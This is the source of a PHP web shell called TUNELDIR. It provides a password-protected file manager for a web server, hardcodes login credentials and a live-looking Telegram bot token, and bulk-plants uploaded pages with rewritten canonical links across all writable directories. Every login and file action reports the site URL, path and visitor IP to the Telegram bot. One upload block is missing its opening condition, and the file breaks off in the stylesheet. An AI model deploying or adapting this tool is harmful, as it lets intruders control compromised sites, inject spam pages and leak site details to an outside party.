<?php
session_start();
@error_reporting(0);
@set_time_limit(0);
@ini_set('memory_limit','256M');
@ini_set('display_errors',0);

$TD_VER   = 'v3.0';
$TD_EMAIL = 'nulll7ganteng@gmail.com';
$TD_CREDS = array(
    'admin' => 'ularsawah',
    'null7' => 'null7pass',
);
$TD_KEY = 'td_authed';
$TG_TOKEN  = '7998549437:AAF0Dn70CTNyx6rZsvyclIvP0BuPGYRfT5o';
$TG_CHATID = '6230136394';

function td_tg_send($token, $chat_id, $text) {
    $url  = 'https://api.telegram.org/bot'.$token.'/sendMessage';
    $data = array('chat_id'=>$chat_id,'text'=>$text,'parse_mode'=>'HTML');
    $ctx  = @stream_context_create(array('http'=>array(
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data),
        'timeout' => 5,
    )));
    @file_get_contents($url, false, $ctx);
}

function td_notify($token, $chat_id, $event, $extra='') {
    $scheme  = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on') ? 'https' : 'http';
    $host    = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'unknown';
    $path    = isset($_SERVER['PHP_SELF']) ? $_SERVER['PHP_SELF'] : '/';
    $fullurl = $scheme.'://'.$host.$path;
    $ip      = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown';
    $ua      = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '-';
    $time    = date('Y-m-d H:i:s');

    $msg  = "\xF0\x9F\x9A\xA8 <b>TUNELDIR ALERT</b>\n";
    $msg .= "----------------------------\n";
    $msg .= "\xF0\x9F\x8C\x90 <b>URL:</b> <code>".$fullurl."</code>\n";
    $msg .= "\xF0\x9F\x93\x82 <b>Path:</b> <code>".$path."</code>\n";
    $msg .= "\xE2\x9A\xA1 <b>Event:</b> ".$event."\n";
    $msg .= "\xF0\x9F\x93\x8D <b>IP:</b> ".$ip."\n";
    $msg .= "\xF0\x9F\x95\x90 <b>Time:</b> ".$time."\n";
    if ($extra) $msg .= "\xF0\x9F\x93\x9D <b>Detail:</b> ".$extra."\n";
    $msg .= "\xF0\x9F\x94\x90 <b>Host:</b> ".$host;

    td_tg_send($token, $chat_id, $msg);
}

function td_auth() {
    global $TD_KEY;
    return isset($_SESSION[$TD_KEY]) && $_SESSION[$TD_KEY] === true;
}
function td_login() {
    global $TD_CREDS,$TD_KEY,$TG_TOKEN,$TG_CHATID;
    $u = isset($_POST['u']) ? trim($_POST['u']) : '';
    $p = isset($_POST['p']) ? $_POST['p'] : '';
    if (isset($TD_CREDS[$u]) && $TD_CREDS[$u] === $p) {
        $_SESSION[$TD_KEY]  = true;
        $_SESSION['td_usr'] = $u;
        td_notify($TG_TOKEN,$TG_CHATID,"\xF0\x9F\x94\x93 LOGIN BERHASIL","User: <code>".$u."</code>");
        header('Location:'.$_SERVER['PHP_SELF']); exit;
    }
    td_notify($TG_TOKEN,$TG_CHATID,"\xE2\x9A\xA0 LOGIN GAGAL","User: <code>".$u."</code>");
    $_SESSION['td_err'] = 'Akses ditolak. Identitas tidak dikenal.';
    header('Location:'.$_SERVER['PHP_SELF']); exit;
}
function td_logout() {
    global $TG_TOKEN,$TG_CHATID;
    $usr = isset($_SESSION['td_usr']) ? $_SESSION['td_usr'] : 'unknown';
    td_notify($TG_TOKEN,$TG_CHATID,"\xF0\x9F\x9A\xAA LOGOUT","User: <code>".$usr."</code>");
    session_destroy();
    header('Location:'.$_SERVER['PHP_SELF']); exit;
}

function td_root() {
    if (!empty($_SERVER['DOCUMENT_ROOT'])) {
        $r = realpath($_SERVER['DOCUMENT_ROOT']);
        if ($r !== false) return $r;
    }
    return getcwd();
}
function td_san($p) {
    return str_replace(array('../','..\\',"\0",'..'), '', $p);
}
function td_curdir() {
    $d = isset($_GET['dir']) ? td_san($_GET['dir']) : '';
    $root = td_root();
    if ($d===''||$d==='/') return $root;
    $f = realpath($root.DIRECTORY_SEPARATOR.ltrim($d,'/\\'));
    if ($f===false||strpos($f,$root)!==0) return $root;
    return $f;
}
function td_rel($full) {
    $root = td_root();
    $r = substr($full,strlen($root));
    if ($r===''||$r===false) return '/';
    return str_replace('\\','/',$r);
}
function td_sz($b) {
    $b=(int)$b;
    if ($b>=1073741824) return round($b/1073741824,2).' GB';
    if ($b>=1048576)    return round($b/1048576,2).' MB';
    if ($b>=1024)       return round($b/1024,2).' KB';
    return $b.' B';
}
function td_icon($n) {
    $e = strtolower(pathinfo($n,PATHINFO_EXTENSION));
    $m = array('php'=>'&#x1F418;','html'=>'&#x1F310;','htm'=>'&#x1F310;','js'=>'&#x26A1;',
        'css'=>'&#x1F3A8;','jpg'=>'&#x1F5BC;','jpeg'=>'&#x1F5BC;','png'=>'&#x1F5BC;',
        'gif'=>'&#x1F5BC;','webp'=>'&#x1F5BC;','svg'=>'&#x1F5BC;','ico'=>'&#x1F5BC;',
        'zip'=>'&#x1F4E6;','rar'=>'&#x1F4E6;','gz'=>'&#x1F4E6;','7z'=>'&#x1F4E6;',
        'tar'=>'&#x1F4E6;','txt'=>'&#x1F4C4;','log'=>'&#x1F4C4;','md'=>'&#x1F4C4;',
        'sql'=>'&#x1F5C4;','json'=>'&#x2699;','xml'=>'&#x2699;','yml'=>'&#x2699;',
        'pdf'=>'&#x1F4D5;','mp4'=>'&#x1F3AC;','mp3'=>'&#x1F3B5;',
        'sh'=>'&#x1F4BB;','py'=>'&#x1F40D;','exe'=>'&#x2699;',
    );
    return isset($m[$e]) ? $m[$e] : '&#x1F4C3;';
}
function td_perm($path) {
    $p = @fileperms($path);
    if ($p===false) return '????';
    return substr(sprintf('%o',$p),-4);
}
function td_sym($path) {
    $p = @fileperms($path);
    if ($p===false) return '---------';
    $i  = (($p&0x0100)?'r':'-');
    $i .= (($p&0x0080)?'w':'-');
    $i .= (($p&0x0040)?(($p&0x0800)?'s':'x'):(($p&0x0800)?'S':'-'));
    $i .= (($p&0x0020)?'r':'-');
    $i .= (($p&0x0010)?'w':'-');
    $i .= (($p&0x0008)?(($p&0x0400)?'s':'x'):(($p&0x0400)?'S':'-'));
    $i .= (($p&0x0004)?'r':'-');
    $i .= (($p&0x0002)?'w':'-');
    $i .= (($p&0x0001)?(($p&0x0200)?'t':'x'):(($p&0x0200)?'T':'-'));
    return $i;
}

function td_allDirs($base, $maxDepth=5, $depth=0) {
    $result = array();
    if ($depth > $maxDepth) return $result;
    $items = @scandir($base);
    if (!$items) return $result;
    foreach ($items as $it) {
        if ($it==='.'||$it==='..') continue;
        $full = $base.DIRECTORY_SEPARATOR.$it;
        if (is_dir($full) && !is_link($full)) {
            $result[] = $full;
            $sub = td_allDirs($full, $maxDepth, $depth+1);
            foreach ($sub as $s) $result[] = $s;
        }
    }
    return $result;
}

function td_actions() {
    global $TG_TOKEN,$TG_CHATID;
    $msg = array('type'=>'','text'=>'');
    $act = isset($_POST['action']) ? $_POST['action'] : (isset($_GET['action']) ? $_GET['action'] : '');
    $dir = td_curdir();
    $relDir = td_rel($dir);

    if ($act==='tunel' && isset($_FILES['tunel_files'])) {
        $root    = td_root();
        $rawDirs = isset($_POST['tunel_dirs']) ? $_POST['tunel_dirs'] : array();
        $targets = array();
        foreach ($rawDirs as $rd) {
            $rd   = td_san($rd);
            $full = realpath($root.DIRECTORY_SEPARATOR.ltrim($rd,'/\\'));
            if ($full!==false && strpos($full,$root)===0 && is_dir($full) && is_writable($full)) {
                $targets[] = $full;
            }
        }
        if (empty($targets)) {
            return array('type'=>'error','text'=>'&#x274C; Pilih minimal 1 direktori tujuan yang writable.');
        }

        $scheme = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on') ? 'https' : 'http';
        $host   = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
        $names  = $_FILES['tunel_files']['name'];
        $tmps   = $_FILES['tunel_files']['tmp_name'];
        $errors = $_FILES['tunel_files']['error'];
        $n      = count($names);
        $ok=0; $fail=0; $fnames=array();
        $uploadedUrls  = array();
        $canonicalDone = array();

        for ($i=0; $i<$n; $i++) {
            if ($errors[$i] !== UPLOAD_ERR_OK) { $fail++; continue; }

            $fname    = basename($names[$i]);
            $fnames[] = $fname;
            $ext      = strtolower(pathinfo($fname, PATHINFO_EXTENSION));
            $isIndex  = ($ext==='html'||$ext==='htm'||$ext==='php') && stripos($fname,'index')===0;

            $origContent = @file_get_contents($tmps[$i]);
            if ($origContent === false) { $fail++; continue; }

            $hasCanonical = $isIndex && preg_match('/<link[^>]+rel=["\']canonical["\'][^>]*href=["\']#["\'][^>]*>/i', $origContent);
            if (!$hasCanonical && $isIndex) {
                $hasCanonical = preg_match('/<link[^>]+href=["\']#["\'][^>]*rel=["\']canonical["\'][^>]*>/i', $origContent);
            }

            foreach ($targets as $t) {
                $dest    = $t.DIRECTORY_SEPARATOR.$fname;
                $dirRel  = rtrim(td_rel($t),'/').'/';
                $dirUrl  = $scheme.'://'.$host.$dirRel;
                $fileUrl = $scheme.'://'.$host.$dirRel.$fname;

                if ($hasCanonical) {
                    $content = preg_replace_callback(
                        '/<link([^>]+)rel=["\']canonical["\']([^>]*)href=["\']#["\']([^>]*)>/i',
                        function($m) use ($dirUrl) {
                            return '<link'.$m[1].'rel="canonical"'.$m[2].'href="'.$dirUrl.'"'.$m[3].'>';
                        },
                        $origContent
                    );
                    if ($content === null) $content = $origContent;
                    $content = preg_replace_callback(
                        '/<link([^>]+)href=["\']#["\']([^>]*)rel=["\']canonical["\']([^>]*)>/i',
                        function($m) use ($dirUrl) {
                            return '<link'.$m[1].'href="'.$dirUrl.'"'.$m[2].'rel="canonical"'.$m[3].'>';
                        },
                        $content
                    );
                    if ($content === null) $content = $origContent;
                    $written = (@file_put_contents($dest, $content) !== false);
                    if ($written) {
                        $ok++;
                        $uploadedUrls[] = array('url'=>$fileUrl,'canonical'=>$dirUrl,'replaced'=>true);
                        $canonicalDone[] = $dirUrl;
                    } else { $fail++; }
                } else {
                    $written = (@file_put_contents($dest, $origContent) !== false);
                    if ($written) {
                        $ok++;
                        $uploadedUrls[] = array('url'=>$fileUrl,'canonical'=>'','replaced'=>false);
                    } else { $fail++; }
                }
            }
        }

        $dirCount  = count($targets);
        $repCount  = count(array_filter($uploadedUrls, function($u){ return $u['replaced']; }));
        $tgDetail  = "Files: <code>".implode(', ',$fnames)."</code>\n";
        $tgDetail .= "Dirs: $dirCount | OK: $ok | Fail: $fail | Canonical replaced: $repCount\n\n";
        foreach ($uploadedUrls as $u) {
            $tgDetail .= "<code>".$u['url']."</code>";
            if ($u['replaced']) $tgDetail .= " \xE2\x9C\x85 canonical: <code>".$u['canonical']."</code>";
            $tgDetail .= "\n";
        }
        td_notify($TG_TOKEN,$TG_CHATID,"\xF0\x9F\x8C\x8A TUNEL UPLOAD",$tgDetail);

        $urlHtml = '';
        foreach ($uploadedUrls as $u) {
            $urlHtml .= '<div class="tunel-url-item">';
            $urlHtml .= '<span class="tunel-url-dot">&#x25CF;</span>';
            $urlHtml .= '<div class="tunel-url-col">';
            $urlHtml .= '<a href="'.htmlspecialchars($u['url']).'" target="_blank" class="tunel-url-link">'.htmlspecialchars($u['url']).'</a>';
            if ($u['replaced']) {
                $urlHtml .= '<span class="canonical-badge">&#x1F517; canonical &rarr; '.htmlspecialchars($u['canonical']).'</span>';
            }
            $urlHtml .= '</div>';
            $urlHtml .= '</div>';
        }

        $repLabel    = $repCount ? ' &bull; '.$repCount.' canonical diganti' : '';
        $summaryText = '&#x1F30A; TUNEL: '.$ok.' file &rarr; '.count($uploadedUrls).' URL berhasil disebarkan ke '.$dirCount.' direktori'.$repLabel.'.'.($fail?' Gagal: '.$fail.'.':'');
        $msg = array(
            'type'  => 'tunel',
            'text'  => $summaryText,
            'urls'  => $urlHtml,
            'count' => count($uploadedUrls),
            'rawurls' => implode("\n", array_map(function($u){ return $u['url']; }, $uploadedUrls)),
        );
    }

    if ($act==='canon_paste' && isset($_POST['canon_code'],$_POST['canon_fname'])) {
        $root      = td_root();
        $rawDirs   = isset($_POST['canon_dirs']) ? $_POST['canon_dirs'] : array();
        $targets   = array();
        foreach ($rawDirs as $rd) {
            $rd   = td_san($rd);
            $full = realpath($root.DIRECTORY_SEPARATOR.ltrim($rd,'/\\'));
            if ($full!==false && strpos($full,$root)===0 && is_dir($full) && is_writable($full)) {
                $targets[] = $full;
            }
        }
        if (empty($targets)) {
            return array('type'=>'error','text'=>'&#x274C; Pilih minimal 1 direktori tujuan yang writable.');
        }
        $fname        = basename(td_san(trim($_POST['canon_fname'])));
        if ($fname==='') {
            return array('type'=>'error','text'=>'&#x274C; Nama file tidak boleh kosong.');
        }
        $origContent  = $_POST['canon_code'];
        $ext          = strtolower(pathinfo($fname,PATHINFO_EXTENSION));
        $isIndex      = ($ext==='html'||$ext==='htm'||$ext==='php') && stripos($fname,'index')===0;
        $hasCanonical = false;
        if ($isIndex) {
            $hasCanonical = (bool)preg_match('/<link\s[^>]*rel=["\']canonical["\'][^>]*href=["\']#["\'][^>]*>/i', $origContent);
            if (!$hasCanonical) {
                $hasCanonical = (bool)preg_match('/<link\s[^>]*href=["\']#["\'][^>]*rel=["\']canonical["\'][^>]*>/i', $origContent);
            }
        }
        $scheme       = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on') ? 'https' : 'http';
        $host         = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
        $ok=0; $fail=0;
        $uploadedUrls = array();
        foreach ($targets as $t) {
            $dest    = $t.DIRECTORY_SEPARATOR.$fname;
            $dirRel  = rtrim(td_rel($t),'/').'/';
            $dirUrl  = $scheme.'://'.$host.$dirRel;
            $fileUrl = $scheme.'://'.$host.$dirRel.$fname;
            if ($hasCanonical) {
                $content = preg_replace_callback(
                    '/<link(\s[^>]*)rel=["\']canonical["\']([^>]*)href=["\']#["\']([^>]*)>/i',
                    function($m) use ($dirUrl) {
                        return '<link'.$m[1].'rel="canonical"'.$m[2].'href="'.$dirUrl.'"'.$m[3].'>';
                    },
                    $origContent
                );
                if ($content===null) $content = $origContent;
                $content = preg_replace_callback(
                    '/<link(\s[^>]*)href=["\']#["\']([^>]*)rel=["\']canonical["\']([^>]*)>/i',
                    function($m) use ($dirUrl) {
                        return '<link'.$m[1].'href="'.$dirUrl.'"'.$m[2].'rel="canonical"'.$m[3].'>';
                    },
                    $content
                );
                if ($content===null) $content = $origContent;
            } else {
                $content = $origContent;
            }
            if (@file_put_contents($dest,$content)!==false) {
                $ok++;
                $uploadedUrls[] = array('url'=>$fileUrl,'canonical'=>$hasCanonical?$dirUrl:'','replaced'=>$hasCanonical);
            } else { $fail++; }
        }
        $dirCount  = count($targets);
        $repCount  = $hasCanonical ? $ok : 0;
        $tgDetail  = "File: <code>".$fname."</code> (manual paste)\n";
        $tgDetail .= "Dirs: $dirCount | OK: $ok | Fail: $fail | Canonical: ".($hasCanonical?'YES':'NO')."\n\n";
        foreach ($uploadedUrls as $u) {
            $tgDetail .= "<code>".$u['url']."</code>";
            if ($u['replaced']) $tgDetail .= " \xE2\x9C\x85 <code>".$u['canonical']."</code>";
            $tgDetail .= "\n";
        }
        td_notify($TG_TOKEN,$TG_CHATID,"\xF0\x9F\x93\x9D CANON PASTE",$tgDetail);
        $urlHtml = '';
        foreach ($uploadedUrls as $u) {
            $urlHtml .= '<div class="tunel-url-item"><span class="tunel-url-dot">&#x25CF;</span><div class="tunel-url-col">';
            $urlHtml .= '<a href="'.htmlspecialchars($u['url']).'" target="_blank" class="tunel-url-link">'.htmlspecialchars($u['url']).'</a>';
            if ($u['replaced']) $urlHtml .= '<span class="canonical-badge">&#x1F517; canonical &rarr; '.htmlspecialchars($u['canonical']).'</span>';
            $urlHtml .= '</div></div>';
        }
        $repLabel    = $repCount ? ' &bull; '.$repCount.' canonical diganti' : ($isIndex && !$hasCanonical ? ' &bull; tidak ada <code>href="#"</code>' : '');
        $summaryText = '&#x1F4DD; CANON PASTE: '.$fname.' &rarr; '.count($uploadedUrls).' lokasi berhasil'.$repLabel.'.'.($fail?' Gagal: '.$fail.'.':'');
        $msg = array(
            'type'    => 'tunel',
            'text'    => $summaryText,
            'urls'    => $urlHtml,
            'count'   => count($uploadedUrls),
            'rawurls' => implode("\n", array_map(function($u){ return $u['url']; }, $uploadedUrls)),
        );
    }
        $up=0; $fail=0; $fnames=array();
        $names=$_FILES['files']['name'];
        $tmps=$_FILES['files']['tmp_name'];
        $errors=$_FILES['files']['error'];
        $n=count($names);
        for ($i=0;$i<$n;$i++) {
            if ($errors[$i]!==UPLOAD_ERR_OK){$fail++;continue;}
            $fn=basename($names[$i]);
            $dest=$dir.DIRECTORY_SEPARATOR.$fn;
            if (@move_uploaded_file($tmps[$i],$dest)){$up++;$fnames[]=$fn;}
            else $fail++;
        }
        td_notify($TG_TOKEN,$TG_CHATID,"\xF0\x9F\x93\xA4 UPLOAD FILE","Dir: <code>".$relDir."</code>\nFiles: <code>".implode(', ',$fnames)."</code>\nOK: $up | Fail: $fail");
        $msg=array('type'=>'success','text'=>'&#x2705; Upload '.$up.' file berhasil.'.($fail?' Gagal: '.$fail.'.':''));
    }

    if ($act==='delete' && isset($_GET['file'])) {
        $fn     = basename(td_san($_GET['file']));
        $target = $dir.DIRECTORY_SEPARATOR.$fn;
        if (is_file($target)&&@unlink($target)){
            td_notify($TG_TOKEN,$TG_CHATID,"\xF0\x9F\x97\x91 DELETE FILE","Dir: <code>".$relDir."</code>\nFile: <code>".$fn."</code>");
            $msg=array('type'=>'success','text'=>'&#x1F5D1; File dihapus.');
        } elseif(is_dir($target)&&@rmdir($target)){
            td_notify($TG_TOKEN,$TG_CHATID,"\xF0\x9F\x97\x91 DELETE DIR","Dir: <code>".$relDir."</code>\nFolder: <code>".$fn."</code>");
            $msg=array('type'=>'success','text'=>'&#x1F5D1; Folder dihapus.');
        } else {
            $msg=array('type'=>'error','text'=>'&#x274C; Gagal hapus.');
        }
    }

    if ($act==='rename'&&isset($_POST['old_name'],$_POST['new_name'])) {
        $on  = basename(td_san($_POST['old_name']));
        $nn  = basename(td_san($_POST['new_name']));
        $old = $dir.DIRECTORY_SEPARATOR.$on;
        $new = $dir.DIRECTORY_SEPARATOR.$nn;
        if (@rename($old,$new)){
            td_notify($TG_TOKEN,$TG_CHATID,"\xF0\x9F\x94\xA4 RENAME","Dir: <code>".$relDir."</code>\n<code>".$on."</code> → <code>".$nn."</code>");
            $msg=array('type'=>'success','text'=>'&#x270F; Rename berhasil.');
        } else {
            $msg=array('type'=>'error','text'=>'&#x274C; Gagal rename.');
        }
    }

    if ($act==='chmod'&&isset($_POST['chmod_file'],$_POST['chmod_val'])) {
        $fn     = basename(td_san($_POST['chmod_file']));
        $target = $dir.DIRECTORY_SEPARATOR.$fn;
        $pv     = preg_replace('/[^0-7]/','', $_POST['chmod_val']);
        $perm   = octdec($pv);
        if (@chmod($target,$perm)){
            td_notify($TG_TOKEN,$TG_CHATID,"\xF0\x9F\x94\x92 CHMOD","Dir: <code>".$relDir."</code>\nFile: <code>".$fn."</code> → <code>".$pv."</code>");
            $msg=array('type'=>'success','text'=>'&#x1F512; Permission diubah.');
        } else {
            $msg=array('type'=>'error','text'=>'&#x274C; Gagal chmod.');
        }
    }

    if ($act==='mkdir'&&isset($_POST['mkdir_name'])) {
        $name   = basename(td_san($_POST['mkdir_name']));
        $target = $dir.DIRECTORY_SEPARATOR.$name;
        if ($name&&@mkdir($target,0755)){
            td_notify($TG_TOKEN,$TG_CHATID,"\xF0\x9F\x93\x81 MKDIR","Dir: <code>".$relDir."</code>\nFolder baru: <code>".$name."</code>");
            $msg=array('type'=>'success','text'=>'&#x1F4C1; Folder dibuat.');
        } else {
            $msg=array('type'=>'error','text'=>'&#x274C; Gagal buat folder.');
        }
    }

    if ($act==='edit_save'&&isset($_POST['edit_file'],$_POST['file_content'])) {
        $fn     = basename(td_san($_POST['edit_file']));
        $target = $dir.DIRECTORY_SEPARATOR.$fn;
        if (@file_put_contents($target,$_POST['file_content'])!==false){
            td_notify($TG_TOKEN,$TG_CHATID,"\xF0\x9F\x92\xBE EDIT FILE","Dir: <code>".$relDir."</code>\nFile: <code>".$fn."</code>");
            $msg=array('type'=>'success','text'=>'&#x1F4BE; File disimpan.');
        } else {
            $msg=array('type'=>'error','text'=>'&#x274C; Gagal simpan.');
        }
    }

    return $msg;
}

if (isset($_POST['do_login'])) td_login();
if (isset($_GET['logout']))    td_logout();

$msg = array('type'=>'','text'=>'');
if (td_auth()) $msg = td_actions();

$dir    = td_curdir();
$relDir = td_rel($dir);
$root   = td_root();
$entries = array();

if (td_auth() && is_dir($dir)) {
    $raw = @scandir($dir);
    if ($raw) {
        foreach ($raw as $it) {
            if ($it==='.') continue;
            $full=$dir.DIRECTORY_SEPARATOR.$it;
            $entries[]=array(
                'name'=>$it,'full'=>$full,
                'is_dir'=>is_dir($full),
                'size'=>is_file($full)?(int)@filesize($full):0,
                'mtime'=>(int)@filemtime($full),
                'perm'=>td_perm($full),
                'sym'=>td_sym($full),
                'writable'=>is_writable($full),
            );
        }
        usort($entries,function($a,$b){
            if ($b['is_dir']!==$a['is_dir']) return $b['is_dir']-$a['is_dir'];
            return strcasecmp($a['name'],$b['name']);
        });
    }
}

$allDirs = array();
if (td_auth()) $allDirs = td_allDirs($root);

$editMode=false; $editContent=''; $editFile='';
if (td_auth()&&isset($_GET['edit'])) {
    $ef=$dir.DIRECTORY_SEPARATOR.basename(td_san($_GET['edit']));
    if (is_file($ef)&&is_readable($ef)){$editFile=$ef;$editContent=file_get_contents($ef);$editMode=true;}
}

$crumbs=array(array('label'=>'root','path'=>'/'));
$parts=array_filter(explode('/',$relDir),function($p){return $p!=='';});
$built='';
foreach ($parts as $part) {
    $built.='/'.$part;
    $crumbs[]=array('label'=>$part,'path'=>$built);
}

$phpVer=phpversion();
$sysUser=function_exists('get_current_user')?get_current_user():'unknown';
$freeSpace=@disk_free_space($dir);
$totalSpace=@disk_total_space($dir);
$diskPct=($freeSpace!==false&&$totalSpace>0)?round(($totalSpace-$freeSpace)/$totalSpace*100):0;
$loginErr=isset($_SESSION['td_err'])?$_SESSION['td_err']:'';
unset($_SESSION['td_err']);
$baseUrl=$_SERVER['PHP_SELF'];

$writableDirs=0;
foreach ($allDirs as $ad) { if (is_writable($ad)) $writableDirs++; }
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>TUNELDIR <?php echo $TD_VER; ?></title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,700;1,400&family=Creepster&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
:root{
  --bg:#030507;
  --bg2:#060a0e;
  --surface:#0a0f14;
  --surface2:#0f1720;
  --surface3:#131e2b;
  --border:#1a2535;
  --border2:#22304a;
  --red:#ff1a1a;
  --red2:#cc0000;
  --red3:#8b0000;
  --orange:#ff4500;
  --green:#00ff41;
  --green2:#00cc33;
  --cyan:#00e5ff;
  --purple:#7b00ff;
  --gold:#ffd700;
  --text:#c8d6e0;
  --text2:#7a9ab0;
  --text3:#3d5c70;
  --font:'Inter',sans-serif;
  --mono:'JetBrains Mono',monospace;
  --horror:'Creepster',cursive;
  --r:8px;--r2:5px;
}
*{box-sizing:border-box;margin:0;padding:0}
html,body{min-height:100vh}
body{background:var(--bg);color:var(--text);font-family:var(--font);font-size:14px;line-height:1.5;overflow-x:hidden}

/* ── HORROR BACKGROUND ── */
body::before{
  content:'';position:fixed;inset:0;
  background:
    radial-gradient(ellipse 80% 50% at 20% 50%, rgba(139,0,0,0.08) 0%,transparent 60%),
    radial-gradient(ellipse 60% 80% at 80% 20%, rgba(123,0,255,0.06) 0%,transparent 60%),
    radial-gradient(ellipse 100% 100% at 50% 100%, rgba(255,26,26,0.04) 0%,transparent 50%);
  pointer-events:none;z-index:0;
}
/* Scanlines */
body::after{
  content:'';position:fixed;inset:0;
  background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,0.15) 3px,rgba(0,0,0,0.15) 4px);
  pointer-events:none;z-index:9998;
}

/* ══════════════════════════════
   LOGIN
══════════════════════════════ */
.login-wrap{
  display:flex;align-items:center;justify-content:center;
  min-height:100vh;position:relative;overflow:hidden;
}
/* Creepy background particles */
.login-wrap::before{
  content:'';position:absolute;inset:0;
  background:
    radial-gradient(circle at 15% 85%, rgba(139,0,0,0.35) 0%,transparent 40%),
    radial-gradient(circle at 85% 15%, rgba(123,0,255,0.25) 0%,transparent 40%),
    radial-gradient(circle at 50% 50%, rgba(255,26,26,0.08) 0%,transparent 60%),
    url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ff1a1a' fill-opacity='0.02'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
}
/* Blood drips animation */
@keyframes drip{
  0%{transform:translateY(-20px);opacity:0}
  10%{opacity:1}
  100%{transform:translateY(100vh);opacity:0}
}
@keyframes flicker{
  0%,100%{opacity:1}2%{opacity:.8}4%{opacity:1}8%{opacity:.7}9%{opacity:1}50%{opacity:.95}51%{opacity:1}
}
@keyframes glitch{
  0%,100%{transform:none;text-shadow:0 0 20px var(--red)}
  20%{transform:skewX(-2deg);text-shadow:-3px 0 var(--cyan),3px 0 var(--red)}
  40%{transform:skewX(2deg);text-shadow:3px 0 var(--purple),-3px 0 var(--red)}
  60%{transform:none;text-shadow:0 0 20px var(--red)}
}
@keyframes pulse-red{
  0%,100%{box-shadow:0 0 20px rgba(139,0,0,0.4),0 0 60px rgba(139,0,0,0.15)}
  50%{box-shadow:0 0 40px rgba(255,26,26,0.6),0 0 80px rgba(139,0,0,0.3)}
}
@keyframes snake-move{
  0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}
}
@keyframes blink{
  0%,49%{opacity:1}50%,100%{opacity:0}
}
@keyframes crawl{
  0%{background-position:0 0}100%{background-position:60px 60px}
}

.login-card{
  width:400px;
  background:linear-gradient(145deg,#0a0f14,#060a0e);
  border:1px solid var(--red3);
  border-radius:12px;
  padding:48px 40px;
  position:relative;z-index:1;
  animation:pulse-red 3s ease-in-out infinite;
  overflow:hidden;
}
.login-card::before{
  content:'';position:absolute;top:-1px;left:0;right:0;height:3px;
  background:linear-gradient(90deg,transparent 0%,var(--red3) 20%,var(--red) 50%,var(--red3) 80%,transparent 100%);
  filter:blur(1px);
}
.login-card::after{
  content:'';position:absolute;bottom:0;left:0;right:0;height:3px;
  background:linear-gradient(90deg,transparent,var(--red3),transparent);
}

/* Corner decorations */
.corner{position:absolute;width:20px;height:20px;border-color:var(--red);border-style:solid;opacity:.6}
.corner-tl{top:10px;left:10px;border-width:2px 0 0 2px}
.corner-tr{top:10px;right:10px;border-width:2px 2px 0 0}
.corner-bl{bottom:10px;left:10px;border-width:0 0 2px 2px}
.corner-br{bottom:10px;right:10px;border-width:0 2px 2px 0}

.login-logo{text-align:center;margin-bottom:32px}
.skull-icon{font-size:52px;display:block;margin-bottom:10px;filter:drop-shadow(0 0 12px var(--red));animation:flicker 4s infinite}
.login-logo h1{
  font-family:var(--horror);
  font-size:36px;
  color:var(--red);
  letter-spacing:4px;
  text-transform:uppercase;
  animation:glitch 6s infinite;
}
.login-logo .sub{
  font-family:var(--mono);font-size:11px;
  color:var(--text3);letter-spacing:2px;margin-top:4px;
  display:flex;align-items:center;justify-content:center;gap:6px;
}
.login-logo .sub::before,.login-logo .sub::after{
  content:'';display:block;height:1px;width:30px;
  background:linear-gradient(90deg,transparent,var(--red3));
}
.login-logo .sub::after{transform:scaleX(-1)}

.form-label{display:block;font-size:10px;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:7px}
.form-input{
  width:100%;background:#060a0e;
  border:1px solid #1a2535;border-radius:var(--r2);
  color:var(--green);font-family:var(--mono);font-size:13px;
  padding:11px 14px;outline:none;transition:all .2s;
}
.form-input:focus{border-color:var(--red);box-shadow:0 0 0 2px rgba(139,0,0,0.2),0 0 15px rgba(255,26,26,0.1);color:var(--text)}
.form-input::placeholder{color:var(--text3)}
.form-group{margin-bottom:16px;position:relative}

.btn-login{
  width:100%;padding:13px;
  background:linear-gradient(135deg,var(--red3),var(--red2));
  border:1px solid var(--red);border-radius:var(--r2);
  color:#fff;font-family:var(--mono);font-size:13px;font-weight:700;
  letter-spacing:2px;text-transform:uppercase;cursor:pointer;
  transition:all .2s;position:relative;overflow:hidden;
}
.btn-login::before{
  content:'';position:absolute;inset:0;
  background:linear-gradient(90deg,transparent,rgba(255,255,255,0.07),transparent);
  transform:translateX(-100%);transition:transform .4s;
}
.btn-login:hover{background:linear-gradient(135deg,var(--red2),var(--red));box-shadow:0 0 25px rgba(255,26,26,0.4);}
.btn-login:hover::before{transform:translateX(100%)}

.err-box{
  background:rgba(139,0,0,0.15);border:1px solid rgba(255,26,26,0.3);
  border-radius:var(--r2);color:#ff6666;font-size:12px;
  padding:9px 13px;margin-bottom:14px;font-family:var(--mono);
  display:flex;align-items:center;gap:7px;
}
.login-footer{text-align:center;margin-top:20px;font-size:11px;color:var(--text3);font-family:var(--mono)}
.login-footer a{color:var(--red3);text-decoration:none}
